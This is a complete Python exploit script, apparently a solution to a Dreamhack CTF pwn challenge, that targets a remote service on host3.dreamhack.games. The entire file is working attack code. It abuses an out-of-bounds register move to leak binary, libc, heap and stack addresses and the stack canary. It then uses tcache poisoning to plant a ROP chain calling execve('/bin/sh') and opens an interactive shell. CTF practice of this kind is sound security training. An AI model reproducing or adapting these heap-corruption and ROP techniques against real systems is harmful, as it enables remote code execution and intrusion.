#!/usr/bin/env python
import sys
import ptrlib as ptr
import pwn

# exe = ptr.ELF("./prob")
exe = ptr.ELF("./prob_patched")
pwn.context.binary = pwn.ELF(exe.filepath)
# libc = ptr.ELF("/lib/x86_64-linux-gnu/libc.so.6")
libc = ptr.ELF("./libc.so.6")
# ld = ptr.ELF("./ld-linux-x86-64.so.2")

def connect():
    if len(sys.argv) > 1 and sys.argv[1] == "remote":
        return pwn.remote("host3.dreamhack.games", 8680)
        # return pwn.remote("localhost", 8080)
    else:
        return pwn.process(exe.filepath)


def unwrap(x):
    if x is None:
        ptr.logger.error("Failed to unwrap")
        exit(1)
    else:
        return x


def main():
    io = connect()
    remote = True

    def lookup_query(query_idx: int) -> bytes:
        io.sendlineafter(b"instruction: ", b"lookup_query")
        io.sendlineafter(b"index: ", str(query_idx).encode())
        io.recvuntil(b"contains ")
        leak = io.recvuntil(b"\nEnter", drop=True)
        return leak

    def lookup_register(reg_idx: int) -> int:
        io.sendlineafter(b"instruction: ", b"lookup_register")
        io.sendlineafter(b"register: ", str(reg_idx).encode())
        io.recvuntil(b"contains ")
        leak = int(io.recvline().strip(b"\n").decode())
        return leak

    def mov(src: int, dest: int):
        io.sendlineafter(b"instruction: ", b"mov")
        io.sendlineafter(b"register: ", str(src).encode())
        io.sendlineafter(b"register: ", str(dest).encode())
        return

    def mov_raw(src: bytes, dest: bytes):
        io.sendlineafter(b"instruction: ", b"mov")
        io.sendlineafter(b"register: ", src)
        io.sendlineafter(b"register: ", dest)
        return

    def hlt():
        io.sendlineafter(b"instruction: ", b"hlt")
        return

    #### exe leak
    __dso_handle = unwrap(exe.symbol("__dso_handle"))
    query = unwrap(exe.symbol("query"))
    offset = __dso_handle - query
    exe.base = ptr.u64(lookup_query(offset // 8)) - __dso_handle

    #### libc leak
    src = unwrap(exe.symbol("__dso_handle"))
    dest = unwrap(exe.symbol("__dso_handle")) + 8
    reg = unwrap(exe.symbol("reg"))
    offset_to_src = src - reg
    offset_to_dest = dest - reg
    mov(offset_to_src // 4, offset_to_dest // 4)

    src = unwrap(exe.symbol("__dso_handle")) + 4
    dest = unwrap(exe.symbol("__dso_handle")) + 8 + 4
    reg = unwrap(exe.symbol("reg"))
    offset_to_src = src - reg
    offset_to_dest = dest - reg
    mov(offset_to_src // 4, offset_to_dest // 4)

    src = unwrap(exe.got("stderr"))
    dest = unwrap(exe.symbol("__dso_handle"))
    reg = unwrap(exe.symbol("reg"))
    offset_to_src = src - reg
    offset_to_dest = dest - reg
    mov(offset_to_src // 4, offset_to_dest // 4)

    src = unwrap(exe.symbol("stderr")) + 4
    dest = unwrap(exe.symbol("__dso_handle")) + 4
    reg = unwrap(exe.symbol("reg"))
    offset_to_src = src - reg
    offset_to_dest = dest - reg
    mov(offset_to_src // 4, offset_to_dest // 4)

    src = unwrap(exe.symbol("__dso_handle")) + 8
    dest = unwrap(exe.symbol("query"))
    reg = unwrap(exe.symbol("reg"))
    offset_to_src = src - reg
    offset_to_dest = dest - reg
    mov(offset_to_src // 4, offset_to_dest // 4)

    src = unwrap(exe.symbol("__dso_handle")) + 8 + 4
    dest = unwrap(exe.symbol("query")) + 4
    reg = unwrap(exe.symbol("reg"))
    offset_to_src = src - reg
    offset_to_dest = dest - reg
    mov(offset_to_src // 4, offset_to_dest // 4)

    libc.base = ptr.u64(lookup_query(0)) - unwrap(libc.symbol("_IO_2_1_stderr_"))

    #### test: tamper stderr
    src = unwrap(exe.symbol("stderr"))
    dest = unwrap(exe.symbol("__dso_handle"))
    reg = unwrap(exe.symbol("reg"))
    offset_to_src = src - reg
    offset_to_dest = dest - reg
    mov(offset_to_src // 4, offset_to_dest // 4)

    #### heap leak
    src = unwrap(exe.symbol("query")) + 8
    dest = unwrap(exe.symbol("__dso_handle"))
    reg = unwrap(exe.symbol("reg"))
    offset_to_src = src - reg
    offset_to_dest = dest - reg
    mov(offset_to_src // 4, offset_to_dest // 4)

    src = unwrap(exe.symbol("query")) + 8 + 4
    dest = unwrap(exe.symbol("__dso_handle")) + 4
    reg = unwrap(exe.symbol("reg"))
    offset_to_src = src - reg
    offset_to_dest = dest - reg
    mov(offset_to_src // 4, offset_to_dest // 4)

    src = unwrap(exe.symbol("__dso_handle")) + 8
    dest = unwrap(exe.symbol("query"))
    reg = unwrap(exe.symbol("reg"))
    offset_to_src = src - reg
    offset_to_dest = dest - reg
    mov(offset_to_src // 4, offset_to_dest // 4)

    src = unwrap(exe.symbol("__dso_handle")) + 8 + 4
    dest = unwrap(exe.symbol("query")) + 4
    reg = unwrap(exe.symbol("reg"))
    offset_to_src = src - reg
    offset_to_dest = dest - reg
    mov(offset_to_src // 4, offset_to_dest // 4)

    heap_base = ptr.u64(lookup_query(0)) - 0x3B0
    ptr.logger.info(f"heap_base: {hex(heap_base)}")

    #### stack leak
    environ = unwrap(libc.symbol("environ"))
    mov_raw(b"0", (environ + 1).to_bytes(6, byteorder="little"))

    ## tcache poisoning to remove extra one
    def recreate_link(offset: int):
        # tamper link
        src = heap_base + offset
        dest = heap_base + 0x108
        reg = unwrap(exe.symbol("reg"))
        offset_to_src = src - reg
        offset_to_dest = dest - reg
        mov(offset_to_src // 4, offset_to_dest // 4)

        src = heap_base + offset + 4
        dest = heap_base + 0x108 + 4
        reg = unwrap(exe.symbol("reg"))
        offset_to_src = src - reg
        offset_to_dest = dest - reg
        mov(offset_to_src // 4, offset_to_dest // 4)

        # tamper number of bin
        src = heap_base + 0xF80 + 4
        dest = heap_base + 0x20 + 8 + 4
        reg = unwrap(exe.symbol("reg"))
        offset_to_src = src - reg
        offset_to_dest = dest - reg
        mov(offset_to_src // 4, offset_to_dest // 4)
        return

    mov_raw(b"0", ptr.p64(0x0001111111111111))
    mov_raw(b"0", (heap_base + 0xE50).to_bytes(6, byteorder="little"))
    recreate_link(0x1090)
    mov_raw(b"A", b"\0")

    src = heap_base + 0xE70
    dest = unwrap(exe.symbol("__dso_handle"))
    reg = unwrap(exe.symbol("reg"))
    offset_to_src = src - reg
    offset_to_dest = dest - reg
    mov(offset_to_src // 4, offset_to_dest // 4)

    src = heap_base + 0xE70 + 4
    dest = unwrap(exe.symbol("__dso_handle")) + 4
    reg = unwrap(exe.symbol("reg"))
    offset_to_src = src - reg
    offset_to_dest = dest - reg
    mov(offset_to_src // 4, offset_to_dest // 4)

    query = unwrap(exe.symbol("query"))
    __dso_handle = unwrap(exe.symbol("__dso_handle"))
    offset = __dso_handle - query
    stack_addr = ptr.u64(lookup_query(offset // 8))
    ptr.logger.info(f"stack_addr: {hex(stack_addr)}")

    #### canary leak
    canary_addr = stack_addr - 0x130
    ptr.logger.info(f"&canary: {hex(canary_addr)}")
    mov_raw(b"0", (canary_addr + 1).to_bytes(6, byteorder="little"))

    src = heap_base + 0x16F0
    dest = unwrap(exe.symbol("__dso_handle"))
    reg = unwrap(exe.symbol("reg"))
    offset_to_src = src - reg
    offset_to_dest = dest - reg
    mov(offset_to_src // 4, offset_to_dest // 4)

    src = heap_base + 0x16F0 + 4
    dest = unwrap(exe.symbol("__dso_handle")) + 4
    reg = unwrap(exe.symbol("reg"))
    offset_to_src = src - reg
    offset_to_dest = dest - reg
    mov(offset_to_src // 4, offset_to_dest // 4)

    query = unwrap(exe.symbol("query"))
    __dso_handle = unwrap(exe.symbol("__dso_handle"))
    offset = __dso_handle - query
    canary = (ptr.u64(lookup_query(offset // 8)) << 8) & 0xFFFFFFFFFFFFFFFF
    ptr.logger.info(f"canary: {hex(canary)}")

    #### tcache poisoning to write ROP
    ## syscall
    mov_raw(b"0", (canary_addr + 0x18).to_bytes(6, byteorder="little"))
    recreate_link(0x1A20)
    mov_raw(b"A" * 9, b"B" * 7)
    recreate_link(0x1A20)
    mov_raw(
        b"A" * 9, unwrap(next(libc.gadget("syscall"))).to_bytes(6, byteorder="little")
    )

    ## 59
    for i in range(7, 0, -1):
        recreate_link(0x1A20)
        mov_raw(b"A", b"B" * i)
    recreate_link(0x1A20)
    mov_raw(b"A", ptr.p8(59))

    ## pop rsi ret
    mov_raw(b"0", (canary_addr + 0x18 - 0x10).to_bytes(6, byteorder="little"))
    recreate_link(0x3B10)
    mov_raw(b"A" * 9, b"B" * 7)
    recreate_link(0x3B10)
    mov_raw(b"A" * 9, ptr.p64(next(libc.gadget("pop rax; ret"))))

    ## 0
    for i in range(7, 0, -1):
        recreate_link(0x3B10)
        mov_raw(b"A", b"B" * i)
    recreate_link(0x3B10)
    mov_raw(b"A", b"\0")

    ## pop rsi ret
    mov_raw(b"0", (canary_addr + 0x18 - 0x20).to_bytes(6, byteorder="little"))
    recreate_link(0x5C00)
    mov_raw(b"A" * 9, b"B" * 7)
    recreate_link(0x5C00)
    mov_raw(b"A" * 9, ptr.p64(next(libc.gadget("pop rsi; ret;"))))

    ## /bin/sh
    recreate_link(0x5C00)
    mov_raw(b"A", b"B" * 7)
    recreate_link(0x5C00)
    mov_raw(b"A", ptr.p64(next(libc.find("/bin/sh\0"))))

    ## pop rdi ret
    mov_raw(b"0", (canary_addr + 0x18 - 0x30).to_bytes(6, byteorder="little"))
    recreate_link(0x69D0)
    mov_raw(b"A" * 9, b"B" * 7)
    recreate_link(0x69D0)
    mov_raw(b"A" * 9, ptr.p64(next(libc.gadget("pop rdi; ret;"))))

    ## canary
    mov_raw(b"0" * 1, (canary_addr + 0x18 - 0x40).to_bytes(6, byteorder="little"))
    recreate_link(0x7140)
    mov_raw(b"A" * 9, b"B" * 7)
    recreate_link(0x7140)
    mov_raw(b"A" * 9, b"B" + ptr.p64(canary >> 8))
    recreate_link(0x7140)
    mov_raw(b"A", b"B" * 8)

    ## trigger
    hlt()

    io.interactive()
    return


if __name__ == "__main__":
    main()
